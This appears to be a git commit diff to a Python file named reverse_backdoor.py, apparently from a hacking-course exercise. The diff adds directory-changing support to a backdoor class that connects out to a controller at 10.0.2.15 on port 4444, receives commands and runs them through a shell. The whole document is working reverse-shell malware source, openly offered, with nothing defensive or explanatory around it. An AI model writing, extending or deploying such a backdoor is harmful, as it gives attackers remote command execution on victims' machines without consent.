799a613b854436b885dd017481c23028e3459495
my9143434 <my9143434@gmail.com>
2019-07-25 17:51:02 -0700

    Add files via upload

--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import socket, subprocess, time, json
+import socket, subprocess, time, json, os
 
 class Backdoor:
 	def __init__(self, ip, port):
@@ -25,6 +25,10 @@ class Backdoor:
 	def execute_system_command(self, command):
 		return subprocess.check_output(command, shell=True)
 
+	def change_working_directory_to(self, path):
+		os.chdir(path)
+		return "[+] Changing working directory to " + path
+
 # time.sleep(10)
 	def run(self):
 		while True:
@@ -32,8 +36,10 @@ class Backdoor:
 			if command[0] == "exit":
 				self.connection.close()
 				exit()
-			
-			command_result = self.execute_system_command(command) 
+			elif command[0] == "cd" and len(command) > 1:
+				command_result = self.change_working_directory_to(command[1])
+			else:
+				command_result = self.execute_system_command(command) 
 			self.reliable_send(command_result)
 		
 my_backdoor = Backdoor("10.0.2.15", 4444)
